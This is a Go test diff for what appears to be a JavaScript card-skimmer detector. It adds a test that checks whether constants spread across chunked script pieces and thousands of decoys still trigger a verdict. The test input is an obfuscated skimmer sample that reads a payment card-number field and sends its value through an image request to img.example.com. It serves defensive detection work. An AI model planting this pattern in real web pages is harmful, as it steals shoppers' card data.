@@ -2,6 +2,7 @@ package web
 
 import (
 	"context"
+	"fmt"
 	"strings"
 	"testing"
 	"time"
@@ -37,5 +38,22 @@ func TestSkimmerSearchStopsWithTheRun(t *testing.T) {
 	s.inspectCandidates(ctx, skimmerCandidates{others: []FileChange{{Path: "/var/www/shop/a.js"}, {Path: "/var/www/shop/b.js"}}, count: 2})
 	if len(s.issues) != 1 || !strings.Contains(s.issues[0], "2 changed scripts not read for skimmers") {
 		t.Errorf("issues = %q", s.issues)
+	}
+}
+
+// Constants are kept from one piece of a script to the next, and thousands of decoys before the
+// real one do not push it out.
+func TestFoldedConstantsAcrossPiecesAndDecoys(t *testing.T) {
+	var decoys strings.Builder
+	for i := range maxFoldConstants + 100 {
+		fmt.Fprintf(&decoys, "var d%d='x';", i)
+	}
+	src := []byte(decoys.String() + "var a='c_n';/*" + strings.Repeat("x", 2*skimmerChunk) + "*/var f=document.querySelector('[name=\"'+'payment[c'+a+'umber]'+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value")
+	var fam skimmerFamilies
+	for off := 0; off < len(src); off += skimmerChunk {
+		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
+	}
+	if fam.verdict() == nil {
+		t.Error("a constant set two pieces before its use was lost")
 	}
 }
